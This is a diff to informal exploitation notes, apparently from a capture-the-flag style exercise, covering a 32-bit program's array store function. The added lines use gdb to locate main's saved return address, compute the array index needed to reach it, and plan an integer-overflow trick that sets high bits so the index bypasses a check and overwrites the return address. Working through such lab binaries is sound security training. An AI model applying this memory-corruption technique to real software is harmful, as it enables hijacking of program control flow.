@@ -146,19 +146,43 @@ if (check1 == 0 || check2 == 0)
 0xffffd520:    ===> 0xffffd544
 
 
-(gdb) info frame
-  ebp at 0xffffd518, eip at 0xffffd51c
-
-
  mov    -0xc(%ebp),%eax    eax = 7
  shl    $0x2,%eax          eax = 7 * 4 = 28
  add    0x8(%ebp),%eax     eax = 0xffffd544 + 28 = 0xffffd560
  mov    -0x10(%ebp),%edx   edx = 123
  mov    %edx,(%eax)        x/d 0xffffd560 = p  *(int *)0xffffd560 = 123
- 
- 
- 
- 
- 
 ```
+
+so We will overwrite the main return address using the store function.
+
+
+b *main+455  // store
+b *main+520  // read
+
+where the array_ptr is located when value retrieval
+<read_number+40>:	add    0x8(%ebp),%eax
+(gdb) x/x $ebp+8
+0xffffd500:	0xffffd524 <==
+
+0xffffd524 + 7*4 = 0xffffd540
+p *(int *)0xffffd540 = 123
+
+find main eip
+
+info frame
+eip at 0xffffd6ec
+
+(gdb) p/d 0xffffd6ec - 0xffffd524 = 456 / 4 = 114
+
+114 / 3 = 38
+
+so this index cannot be inserted directly to the program
+
+we will go for Integer overflow attack since the index is stored by scanf as %u
+
+114 in binary
+printf %032d 1110010
+00000000000000000000000001110010
+since the index is `shl by $0x2` will get rid of the 2 MSB
+11000000000000000000000001110010 = -1073741710
 
